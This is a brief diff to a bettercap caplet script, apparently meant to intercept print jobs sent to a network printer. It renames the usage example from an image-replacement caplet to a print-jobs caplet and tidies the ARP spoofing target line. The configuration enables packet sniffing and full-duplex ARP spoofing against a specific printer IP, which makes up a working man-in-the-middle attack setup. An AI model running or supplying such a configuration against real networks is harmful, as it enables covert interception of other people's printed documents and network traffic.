@@ -1,5 +1,5 @@
 # usage:
-# sudo ./bettercap -caplet replace-images.cap -eval "set arp.spoof.targets 192.168.1.64"
+# sudo ./bettercap -caplet print-jobs.cap -eval "set arp.spoof.targets 172.16.0.60"
 
 
 # scalpel definitions:
@@ -29,5 +29,5 @@ net.sniff on
 # configure arp.spoofing for specified Printer:
 #set arp.spoof.internal true
 set arp.spoof.fullduplex true
-set arp.spoof.targets  172.16.0.60
+set arp.spoof.targets 172.16.0.60
 arp.spoof on
